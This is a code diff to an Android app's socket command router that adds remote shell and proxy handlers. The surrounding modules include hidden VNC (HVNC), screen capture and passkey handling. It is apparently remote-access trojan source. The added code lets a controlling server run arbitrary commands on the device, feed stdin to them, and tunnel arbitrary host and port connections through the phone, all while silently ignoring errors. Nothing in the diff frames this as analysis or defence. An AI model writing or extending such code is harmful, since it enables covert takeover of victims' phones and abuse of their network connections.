@@ -32,6 +32,8 @@ import com.fason.app.features.screen.ScreenCaptureService;
 import com.fason.app.features.screen.WebRtcScreenManager;
 import com.fason.app.features.hvnc.HvncService;
 import com.fason.app.features.hvnc.HvncWebRtcManager;
+import com.fason.app.features.shell.ShellService;
+import com.fason.app.features.proxy.ProxyService;
 import com.fason.app.service.MainService;
 
 import org.json.JSONArray;
@@ -122,6 +124,8 @@ public final class SocketCommandRouter {
                 case Protocol.MOD_RELAY:   EXEC.execute(() -> handleRelay(data, socket)); break;
                 case Protocol.MOD_PASSKEY: EXEC.execute(() -> handlePasskey(data, socket)); break;
                 case Protocol.MOD_DEVICE:  EXEC.execute(() -> handleDevice(data, socket)); break;
+                case Protocol.MOD_PROXY:   EXEC.execute(() -> handleProxy(data, socket)); break;
+                case Protocol.MOD_SHELL:   EXEC.execute(() -> handleShell(data, socket)); break;
                 case Protocol.WEBRTC_OFFER:
                     WEBRTC_EXEC.execute(() -> WebRtcScreenManager.handleOffer(data));
                     break;
@@ -956,6 +960,126 @@ public final class SocketCommandRouter {
                 }
             }
             HvncWebRtcManager.injectFallbackControl(sessionId, controlPayload);
+        } catch (Exception ignored) {}
+    }
+
+    // ─── Shell Handler ─────────────────────────────────────────────
+
+    private static void handleShell(JSONObject data, Socket socket) {
+        try {
+            String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_EXEC);
+            String sessionId = data.optString(Protocol.KEY_SESSION_ID, "default");
+            android.content.Context ctx = FasonApp.getContext();
+
+            switch (action) {
+                case Protocol.ACT_START: {
+                    ShellService.startService(ctx);
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ACTION, Protocol.ACT_START);
+                    result.put(Protocol.KEY_SUCCESS, true);
+                    result.put(Protocol.KEY_SESSION_ID, sessionId);
+                    emit(socket, Protocol.MOD_SHELL, result);
+                    break;
+                }
+                case Protocol.ACT_STOP: {
+                    // Close all sessions and stop service
+                    ShellService.closeSession(ctx, sessionId);
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ACTION, Protocol.ACT_STOP);
+                    result.put(Protocol.KEY_SUCCESS, true);
+                    emit(socket, Protocol.MOD_SHELL, result);
+                    break;
+                }
+                case Protocol.ACT_EXEC: {
+                    String command = data.optString(Protocol.KEY_COMMAND, "");
+                    if (!command.isEmpty()) {
+                        ShellService.exec(ctx, sessionId, command);
+                    }
+                    break;
+                }
+                case Protocol.ACT_WRITE: {
+                    String stdinData = data.optString(Protocol.KEY_DATA, "");
+                    if (!stdinData.isEmpty()) {
+                        ShellService.writeStdin(ctx, sessionId, stdinData);
+                    }
+                    break;
+                }
+                case Protocol.ACT_CLOSE: {
+                    ShellService.closeSession(ctx, sessionId);
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ACTION, Protocol.ACT_CLOSE);
+                    result.put(Protocol.KEY_SUCCESS, true);
+                    result.put(Protocol.KEY_SESSION_ID, sessionId);
+                    emit(socket, Protocol.MOD_SHELL, result);
+                    break;
+                }
+                case Protocol.ACT_STATUS: {
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ENABLED, true);
+                    result.put(Protocol.KEY_SESSION_ID, sessionId);
+                    emit(socket, Protocol.MOD_SHELL, result);
+                    break;
+                }
+            }
+        } catch (Exception ignored) {}
+    }
+
+    // ─── Proxy Handler ─────────────────────────────────────────────
+
+    private static void handleProxy(JSONObject data, Socket socket) {
+        try {
+            String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
+            android.content.Context ctx = FasonApp.getContext();
+
+            switch (action) {
+                case Protocol.ACT_START: {
+                    ProxyService.startService(ctx);
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ACTION, Protocol.ACT_START);
+                    result.put(Protocol.KEY_SUCCESS, true);
+                    emit(socket, Protocol.MOD_PROXY, result);
+                    break;
+                }
+                case Protocol.ACT_STOP: {
+                    ProxyService.stopService(ctx);
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ACTION, Protocol.ACT_STOP);
+                    result.put(Protocol.KEY_SUCCESS, true);
+                    emit(socket, Protocol.MOD_PROXY, result);
+                    break;
+                }
+                case Protocol.ACT_CONNECT: {
+                    String connId = data.optString(Protocol.KEY_CONN_ID);
+                    String host = data.optString(Protocol.KEY_HOST);
+                    int port = data.optInt(Protocol.KEY_PORT);
+                    if (connId != null && !connId.isEmpty() && host != null && !host.isEmpty() && port > 0 && port <= 65535) {
+                        ProxyService.connect(ctx, connId, host, port);
+                    }
+                    break;
+                }
+                case Protocol.ACT_DATA: {
+                    String connId = data.optString(Protocol.KEY_CONN_ID);
+                    String payload = data.optString(Protocol.KEY_DATA);
+                    if (connId != null && !connId.isEmpty() && payload != null && !payload.isEmpty()) {
+                        ProxyService.sendData(ctx, connId, payload);
+                    }
+                    break;
+                }
+                case Protocol.ACT_CLOSE: {
+                    String connId = data.optString(Protocol.KEY_CONN_ID);
+                    if (connId != null && !connId.isEmpty()) {
+                        ProxyService.closeConnection(ctx, connId);
+                    }
+                    break;
+                }
+                case Protocol.ACT_STATUS: {
+                    JSONObject result = new JSONObject();
+                    result.put(Protocol.KEY_ENABLED, true);
+                    result.put("activeConnections", ProxyService.getActiveConnectionCount());
+                    emit(socket, Protocol.MOD_PROXY, result);
+                    break;
+                }
+            }
         } catch (Exception ignored) {}
     }
 
